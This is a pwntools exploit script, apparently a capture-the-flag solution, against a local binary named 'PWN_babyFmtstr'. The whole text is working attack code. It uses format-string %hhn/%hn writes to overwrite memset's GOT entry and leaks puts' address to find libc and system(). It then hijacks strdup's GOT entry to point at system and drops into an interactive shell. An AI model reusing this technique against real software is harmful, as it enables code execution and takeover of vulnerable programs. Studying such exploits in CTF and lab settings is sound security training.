from pwn import *
context.log_level = "debug"
io = process("PWN_babyFmtstr")   #fmt:8
elf = ELF("PWN_babyFmtstr")
puts_got = elf.got["puts"]
strdup_got = elf.got["strdup"]
memset_got = elf.got["memset"]
#main_addr  400E93
payload_1 = b"%14c%11$hhn%133c%12$hhnA" + p64(memset_got+1)+p64(memset_got) 
io.sendlineafter("please input name:\n",payload_1)
io.sendlineafter("input size of motto:\n","1")
payload_2 = b"AAAA%9$s" + p64(puts_got)
io.sendlineafter("please input name:\n",payload_2)
io.recvuntil("AAAA")
puts_addr = u64(io.recv(6).ljust(8,b"\x00"))
print(hex(puts_addr))
libcbase = puts_addr - 0x06f690
system_addr = libcbase + 0x045390
print(hex(system_addr))
def strdup_system(system):
    x = system >>16 & 0xffff
    y = system & 0xffff
    print(x)
    print(y)
    if x>y:
        payload = flat("%"+str(y)+"c%12$hn%"+str(x-y)+"c%13$hn")
        payload = payload.ljust(32,b"a")
        print(payload)
        payload += p64(strdup_got)+p64(strdup_got+2)  
    if x<y:
        payload = flat("%"+str(x)+"c%12$hn%"+str(y-x)+"c%13$hn")
        payload = payload.ljust(32,b"a")
        print(payload)
        payload += p64(strdup_got+2)+p64(strdup_got)
    return payload
payload_3 = strdup_system(system_addr)
io.sendlineafter("please input name:\n",payload_3)
io.interactive()
